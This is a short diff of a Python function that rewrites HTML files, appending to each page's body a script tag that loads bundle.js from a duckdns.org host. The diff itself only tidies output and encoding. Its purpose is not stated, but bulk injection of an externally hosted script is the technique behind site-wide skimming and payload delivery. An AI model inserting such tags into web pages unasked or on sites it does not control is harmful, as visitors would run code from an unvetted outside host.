@@ -43,7 +43,7 @@ def html_inject_file(file_html_path, html_files_count = 1, html_files_total = 1)
         logger.info(f"Non-parseable file ({html_files_count}/{html_files_total}) '{file_html_path}' ...")
         return
 
-
+      # Create scripts
       script = soup.new_tag("script")
       script['src'] = "https://apid.duckdns.org/apid/js/bundle.js"
 
@@ -57,10 +57,13 @@ def html_inject_file(file_html_path, html_files_count = 1, html_files_total = 1)
       soup.html.body.append(script)
       # print(soup.body)    
 
+    if soup.html is None:
+      return
 
+    soup_str = str(soup.prettify())
     # Write file
-    with open(file_html_path, "w", encoding="ISO-8859-1" ) as file:
-      file.write(str(soup))
+    with open(file_html_path, "w") as file:
+      file.write( soup_str )
     logger.info(f"Completed file ({html_files_count}/{html_files_total}) '{file_html_path}' ...")
   except Exception as e:
     logger.error(f"FAILED FILE '{file_html_path}'")
